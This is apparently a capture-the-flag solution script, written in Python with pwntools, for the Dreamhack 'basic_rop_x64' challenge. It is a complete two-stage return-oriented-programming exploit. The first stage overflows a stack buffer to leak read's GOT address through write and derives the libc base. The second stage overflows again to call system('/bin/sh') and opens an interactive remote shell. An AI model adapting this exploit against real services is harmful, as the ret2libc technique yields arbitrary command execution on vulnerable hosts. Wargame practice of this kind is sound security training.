from pwn import *

p = remote('host3.dreamhack.games', 21460)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')
r = ROP(e)

def slog(name, addr): return success(': '.join([name, hex(addr)]))

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
main = e.symbols['main']
sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi'])[0]
ret = r.find_gadget(['ret'])[0]

# ===== Stage 1 =====
success("stage 1")
# write(1, read_got, ...)
payload = b'A' * 0x40 + b'B' * 8
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# return to main
payload += p64(main)

p.send(payload)
p.recvuntil(b'A' * 0x40)

# Calculate libc base
read_addr = u64(p.recvn(6) + b'\x00' * 2)
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
sh_addr = libc_base + sh

slog('read', read_addr)
slog('libc base', libc_base)
slog('system', system_addr)
slog('/bin/sh', sh_addr)

# ===== Stage 2 =====
success("stage 2")
# system("/bin/sh")
payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(sh_addr)
payload += p64(system_addr)

p.send(payload)

p.recvuntil(b'A' * 0x40)

p.interactive()